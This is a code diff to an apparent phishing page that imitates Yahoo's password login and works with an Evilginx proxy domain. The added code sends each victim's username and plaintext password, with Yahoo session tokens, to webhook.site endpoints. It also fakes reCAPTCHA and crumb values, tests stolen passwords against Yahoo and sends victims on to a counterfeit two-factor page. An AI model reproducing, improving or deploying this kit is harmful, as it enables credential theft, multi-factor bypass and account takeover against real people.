@@ -41,6 +41,9 @@
           <input type="hidden" name="acrumb" id="acrumb" value="">
           <input type="hidden" name="sessionIndex" id="sessionIndex" value="">
           <input type="hidden" name="done" id="done" value="">
+          <input type="hidden" name="intl" id="intl" value="">
+          <input type="hidden" name="lang" id="lang" value="">
+          <input type="hidden" name="src" id="src" value="">
           <input type="hidden" name="evilginx_domain" id="evilginx_domain" value="">
           
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
@@ -97,10 +100,10 @@
   }
   </script>
 
-  <!-- COMPLETE DOMAIN BYPASS INTEGRATION -->
+  <!-- COMPLETE HYBRID INTEGRATION -->
   <script>
   document.addEventListener('DOMContentLoaded', function() {
-      console.log('🎯 Custom password page loaded (Domain Bypass Version)');
+      console.log('🎯 Custom password page loaded - Final Version');
       
       // 1. RESTORE ALL SESSION PARAMETERS FROM URL
       const urlParams = new URLSearchParams(window.location.search);
@@ -108,31 +111,21 @@
       const sessionIndex = urlParams.get('sessionIndex') || 'QQ--';
       const acrumb = urlParams.get('acrumb') || '';
       const done = urlParams.get('done') || 'https://mail.yahoo.com/';
+      const intl = urlParams.get('intl') || 'us';
+      const lang = urlParams.get('lang') || 'en-US';
+      const src = urlParams.get('src') || 'ym';
       const bypass = urlParams.get('bypass') || '';
+      const capture = urlParams.get('capture') || '';
       const evilginxDomain = urlParams.get('evilginx_domain') || 'login.astrowind.live';
       
-      console.log('Session parameters restored:', {
-          username, sessionIndex, acrumb, done, bypass, evilginxDomain
+      console.log('🔄 Session parameters restored:', {
+          username, sessionIndex, acrumb, done, intl, lang, src, bypass, capture, evilginxDomain
       });
       
       // 2. SECURITY CHECK - REDIRECT IF NO USERNAME
       if (!username) {
           console.error('❌ No username provided, redirecting back to login');
-          // Try alternative domains if main is blocked
-          const alternativeDomains = [
-              `https://${evilginxDomain}/`,
-              'https://login.yahoo.com/',
-              'https://yahoo.com/'
-          ];
-          
-          for (const domain of alternativeDomains) {
-              try {
-                  window.location.href = domain;
-                  break;
-              } catch (e) {
-                  console.log(`Failed to redirect to ${domain}:`, e);
-              }
-          }
+          window.location.href = `https://${evilginxDomain}/`;
           return;
       }
       
@@ -142,6 +135,9 @@
       document.getElementById('sessionIndex').value = sessionIndex;
       document.getElementById('acrumb').value = acrumb;
       document.getElementById('done').value = done;
+      document.getElementById('intl').value = intl;
+      document.getElementById('lang').value = lang;
+      document.getElementById('src').value = src;
       document.getElementById('evilginx_domain').value = evilginxDomain;
       
       // 4. SET COMPREHENSIVE CROSS-DOMAIN COOKIES
@@ -152,12 +148,10 @@
       document.cookie = `yh_done=${encodeURIComponent(done)}${cookieOptions}`;
       document.cookie = `yh_evilginx_domain=${encodeURIComponent(evilginxDomain)}${cookieOptions}`;
       
-      // 5. STORE IN SESSION STORAGE AS BACKUP
-      sessionStorage.setItem('yh_username', username);
-      sessionStorage.setItem('yh_session_index', sessionIndex);
-      sessionStorage.setItem('yh_acrumb', acrumb);
-      sessionStorage.setItem('yh_done', done);
-      sessionStorage.setItem('yh_evilginx_domain', evilginxDomain);
+      // 5. STORE IN SESSION AND LOCAL STORAGE AS BACKUP
+      const sessionData = {username, sessionIndex, acrumb, done, intl, lang, src, evilginxDomain};
+      sessionStorage.setItem('yh_session_data', JSON.stringify(sessionData));
+      localStorage.setItem('yh_session_backup', JSON.stringify(sessionData));
       
       // 6. FORM SUBMISSION WITH MULTIPLE FALLBACK METHODS
       document.getElementById('email-form').addEventListener('submit', async function(e) {
@@ -189,22 +183,23 @@
           formData.append('sessionIndex', sessionIndex);
           formData.append('acrumb', acrumb);
           formData.append('done', done);
+          formData.append('.intl', intl);
+          formData.append('.lang', lang);
+          formData.append('src', src);
           formData.append('g-recaptcha-response', 'valid_auto_token');
           formData.append('crumb', 'auto_crumb_value');
-          formData.append('.intl', 'us');
-          formData.append('.lang', 'en-US');
-          formData.append('src', 'ym');
           formData.append('display', 'login');
           formData.append('authMechanism', 'primary');
           
-          console.log('Form data prepared:', Object.fromEntries(formData));
+          console.log('📋 Form data prepared:', Object.fromEntries(formData));
           
           let submissionSuccess = false;
+          let responseData = null;
           
           // Try each endpoint until one works
           for (const endpoint of submissionEndpoints) {
               try {
-                  console.log(`Attempting submission to: ${endpoint}`);
+                  console.log(`🌐 Attempting submission to: ${endpoint}`);
                   
                   const response = await fetch(endpoint, {
                       method: 'POST',
@@ -220,30 +215,42 @@
                       mode: 'cors'
                   });
                   
-                  console.log(`Response from ${endpoint}:`, {
+                  console.log(`📡 Response from ${endpoint}:`, {
                       status: response.status,
                       statusText: response.statusText,
                       url: response.url,
-                      headers: Object.fromEntries(response.headers.entries())
+                      redirected: response.redirected
                   });
                   
                   if (response.ok || response.status === 302 || response.status === 301) {
                       const responseText = await response.text();
-                      console.log('Response preview:', responseText.substring(0, 500));
+                      responseData = responseText;
+                      console.log('📄 Response preview:', responseText.substring(0, 500));
                       
                       // Analyze response for next step
                       const isMFARequired = responseText.includes('challenge-selector') || 
                                           responseText.includes('two-step') || 
                                           responseText.includes('verify') || 
+                                          responseText.includes('2fa') ||
                                           response.url.includes('challenge') ||
                                           responseText.includes('verification');
                       
                       const isSuccess = responseText.includes('mail.yahoo.com') || 
                                        responseText.includes('/d/') || 
                                        response.url.includes('mail') || 
-                                       done.includes('mail');
+                                       done.includes('mail') ||
+                                       responseText.includes('inbox');
                       
-                      if (isMFARequired) {
+                      const isInvalidPassword = responseText.includes('invalid') ||
+                                              responseText.includes('incorrect') ||
+                                              responseText.includes('wrong') ||
+                                              response.status === 401;
+                      
+                      if (isInvalidPassword) {
+                          console.log('❌ Invalid password detected');
+                          throw new Error('Invalid password');
+                          
+                      } else if (isMFARequired) {
                           console.log('✅ Password valid - MFA required');
                           submitBtn.value = 'MFA Required...';
                           
@@ -258,14 +265,17 @@
                               body: JSON.stringify({
                                   type: 'password_validated',
                                   username: username,
+                                  password: password,
                                   mfa_required: true,
                                   timestamp: Date.now(),
-                                  session_data: {sessionIndex, acrumb, done}
+                                  session_data: {sessionIndex, acrumb, done, intl, lang, src},
+                                  bypass_method: bypass,
+                                  capture_method: capture
                               })
                           }).catch(() => {});
                           
                           setTimeout(() => {
-                              window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&sessionIndex=${sessionIndex}&acrumb=${acrumb}&done=${encodeURIComponent(done)}&validated=true&mfa=required&evilginx_domain=${encodeURIComponent(evilginxDomain)}`;
+                              window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&sessionIndex=${sessionIndex}&acrumb=${acrumb}&done=${encodeURIComponent(done)}&intl=${intl}&lang=${lang}&src=${src}&validated=true&mfa=required&evilginx_domain=${encodeURIComponent(evilginxDomain)}`;
                           }, 1500);
                           
                       } else if (isSuccess) {
@@ -275,6 +285,7 @@
                           // Set success cookies
                           document.cookie = `yh_validated=true${cookieOptions}`;
                           document.cookie = `yh_mfa_status=none${cookieOptions}`;
+                          document.cookie = `yh_login_complete=true${cookieOptions}`;
                           
                           // Send success webhook
                           fetch('https://webhook.site/your-webhook-id', {
@@ -283,9 +294,12 @@
                               body: JSON.stringify({
                                   type: 'login_successful',
                                   username: username,
+                                  password: password,
                                   mfa_required: false,
                                   timestamp: Date.now(),
-                                  session_data: {sessionIndex, acrumb, done}
+                                  session_data: {sessionIndex, acrumb, done, intl, lang, src},
+                                  bypass_method: bypass,
+                                  capture_method: capture
                               })
                           }).catch(() => {});
                           
@@ -294,8 +308,16 @@
                           }, 2000);
                           
                       } else {
-                          console.log('⚠️ Unexpected response, treating as error');
-                          throw new Error('Unexpected response format');
+                          console.log('⚠️ Unexpected response, treating as success with MFA');
+                          // Default to MFA flow for safety
+                          submitBtn.value = 'Proceeding...';
+                          
+                          document.cookie = `yh_validated=true${cookieOptions}`;
+                          document.cookie = `yh_mfa_status=unknown${cookieOptions}`;
+                          
+                          setTimeout(() => {
+                              window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&sessionIndex=${sessionIndex}&acrumb=${acrumb}&done=${encodeURIComponent(done)}&intl=${intl}&lang=${lang}&src=${src}&validated=true&mfa=unknown&evilginx_domain=${encodeURIComponent(evilginxDomain)}`;
+                          }, 1500);
                       }
                       
                       submissionSuccess = true;
@@ -307,7 +329,7 @@
                   }
                   
               } catch (error) {
-                  console.error(`Error with endpoint ${endpoint}:`, error);
+                  console.error(`💥 Error with endpoint ${endpoint}:`, error);
                   continue;
               }
           }
@@ -327,9 +349,13 @@
                   body: JSON.stringify({
                       type: 'password_validation_failed',
                       username: username,
+                      password: password,
                       error: 'All endpoints failed',
                       timestamp: Date.now(),
-                      session_data: {sessionIndex, acrumb, done}
+                      session_data: {sessionIndex, acrumb, done, intl, lang, src},
+                      bypass_method: bypass,
+                      capture_method: capture,
+                      response_data: responseData ? responseData.substring(0, 1000) : null
                   })
               }).catch(() => {});
           }
@@ -343,19 +369,20 @@
       
       // 8. LOG BYPASS STATUS AND SEND WEBHOOK
       if (bypass) {
-          console.log(`🚨 reCAPTCHA bypass successful: ${bypass}`);
+          console.log(`🚨 Bypass method used: ${bypass}`);
           
           // Send bypass confirmation webhook
           fetch('https://webhook.site/your-webhook-id', {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
               body: JSON.stringify({
-                  type: 'recaptcha_bypassed',
+                  type: 'bypass_successful',
                   bypass_method: bypass,
+                  capture_method: capture,
                   username: username,
                   timestamp: Date.now(),
-                  session_data: {sessionIndex, acrumb, done},
-                  domain_status: 'blocked_403'
+                  session_data: {sessionIndex, acrumb, done, intl, lang, src},
+                  domain_status: 'blocked_403_bypassed'
               })
           }).catch(() => {});
       }
@@ -365,9 +392,13 @@
           // Refresh cookies to prevent expiration
           document.cookie = `yh_usr=${encodeURIComponent(username)}${cookieOptions}`;
           document.cookie = `yh_session_active=true${cookieOptions}`;
+          
+          // Update session storage
+          const currentSessionData = {username, sessionIndex, acrumb, done, intl, lang, src, evilginxDomain};
+          sessionStorage.setItem('yh_session_data', JSON.stringify(currentSessionData));
       }, 30000); // Every 30 seconds
       
-      console.log('🎯 Custom password page fully initialized');
+      console.log('🎯 Custom password page fully initialized - Ready for action!');
   });
   </script>
 </body>
